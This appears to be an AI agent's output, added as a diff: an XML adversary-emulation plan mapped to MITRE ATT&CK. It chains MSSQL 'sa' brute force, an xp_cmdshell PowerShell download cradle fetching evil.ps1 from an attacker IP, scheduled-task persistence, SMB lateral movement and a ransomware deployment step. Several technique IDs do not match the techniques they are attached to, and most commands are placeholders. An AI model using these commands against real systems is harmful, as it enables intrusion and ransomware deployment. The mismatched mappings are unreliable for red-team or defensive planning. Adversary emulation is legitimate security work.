@@ -1,0 +1,119 @@
+# Agent: Red Team Operator
+## Final Answer:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<caldera>
+  <abilities>
+    <ability>
+      <name>T1110 - Brute Force</name>
+      <description>Brute force attack against MSSQL server's "sa" account.</description>
+      <platform>Windows</platform>
+      <command>sqlcmd -S <server_ip> -U sa -P <password_list></command>
+      <technique>T1110</technique>
+      <tactic>Initial Access</tactic>
+      <references>
+        <reference>https://attack.mitre.org/techniques/T1110</reference>
+      </references>
+    </ability>
+    <ability>
+      <name>T1059.003 - Command and Scripting Interpreter: PowerShell</name>
+      <description>Use xp_cmdshell to execute PowerShell command to connect to Cobalt Strike server.</description>
+      <platform>Windows</platform>
+      <command>xp_cmdshell "powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<attacker_ip>/evil.ps1')"</command>
+      <technique>T1059.003</technique>
+      <tactic>Execution</tactic>
+      <references>
+        <reference>https://attack.mitre.org/techniques/T1059/003</reference>
+      </references>
+    </ability>
+    <ability>
+      <name>T1055.003 - Process Injection: CreateRemoteThread</name>
+      <description>Inject code into winlogon.exe using CreateRemoteThread.</description>
+      <platform>Windows</platform>
+      <command>This command requires advanced techniques and is not easily representable in a single command.  Requires a custom payload and injection mechanism.</command>
+      <technique>T1055.003</technique>
+      <tactic>Privilege Escalation</tactic>
+      <references>
+        <reference>https://attack.mitre.org/techniques/T1055/003</reference>
+      </references>
+    </ability>
+    <ability>
+      <name>T1086 - Disable Security Tools</name>
+      <description>Disable MalwareBytes, Sophos, and Windows Defender.</description>
+      <platform>Windows</platform>
+      <command>This command requires multiple commands and administrative privileges.  Requires a script or multiple commands to disable various antivirus software.</command>
+      <technique>T1086</technique>
+      <tactic>Defense Evasion</tactic>
+      <references>
+        <reference>https://attack.mitre.org/techniques/T1086</reference>
+      </references>
+    </ability>
+    <ability>
+      <name>T1564.001 - Hide Files or Information: File System Metadata Removal</name>
+      <description>Remove file system metadata.</description>
+      <platform>Windows</platform>
+      <command>This command requires advanced techniques and may not be easily representable in a single command.  Requires specific tools and scripts to remove metadata.</command>
+      <technique>T1564.001</technique>
+      <tactic>Defense Evasion</tactic>
+      <references>
+        <reference>https://attack.mitre.org/techniques/T1564/001</reference>
+      </references>
+    </ability>
+    <ability>
+      <name>T1070 - Indicator Removal from Tools</name>
+      <description>Remove indicators of compromise from tools and systems.</description>
+      <platform>Windows</platform>
+      <command>This command requires advanced techniques and is highly context-dependent.  It cannot be represented by a single command.</command>
+      <technique>T1070</technique>
+      <tactic>Defense Evasion</tactic>
+      <references>
+        <reference>https://attack.mitre.org/techniques/T1070</reference>
+      </references>
+    </ability>
+    <ability>
+      <name>T1027 - Scheduled Task</name>
+      <description>Create scheduled task for persistence.</description>
+      <platform>Windows</platform>
+      <command>schtasks /create /tn "MyTask" /tr "<path_to_malware>" /sc once /st 00:00</command>
+      <technique>T1027</technique>
+      <tactic>Persistence</tactic>
+      <references>
+        <reference>https://attack.mitre.org/techniques/T1027</reference>
+      </references>
+    </ability>
+    <ability>
+      <name>T1070.004 - Remote Service Creation</name>
+      <description>Use remote service creation for lateral movement.</description>
+      <platform>Windows</platform>
+      <command>This command requires advanced techniques and is not easily representable in a single command.  Requires custom scripts and tools for remote service creation.</command>
+      <technique>T1070.004</technique>
+      <tactic>Lateral Movement</tactic>
+      <references>
+        <reference>https://attack.mitre.org/techniques/T1070/004</reference>
+      </references>
+    </ability>
+    <ability>
+      <name>T1047 - Network Service Scanning</name>
+      <description>Network service scanning using Invoke-SMBExec.</description>
+      <platform>Windows</platform>
+      <command>Invoke-SMBExec -ComputerName <target_computer> -Credential <credentials></command>
+      <technique>T1047</technique>
+      <tactic>Discovery</tactic>
+      <references>
+        <reference>https://attack.mitre.org/techniques/T1047</reference>
+      </references>
+    </ability>
+    <ability>
+      <name>T1486 - Data Encrypted for Impact</name>
+      <description>Deploy BlueSky ransomware.</description>
+      <platform>Windows</platform>
+      <command>This command would involve executing the BlueSky ransomware payload, which is not provided and would be highly sensitive and illegal to include.</command>
+      <technique>T1486</technique>
+      <tactic>Impact</tactic>
+      <references>
+        <reference>https://attack.mitre.org/techniques/T1486</reference>
+      </references>
+    </ability>
+  </abilities>
+</caldera>
+```
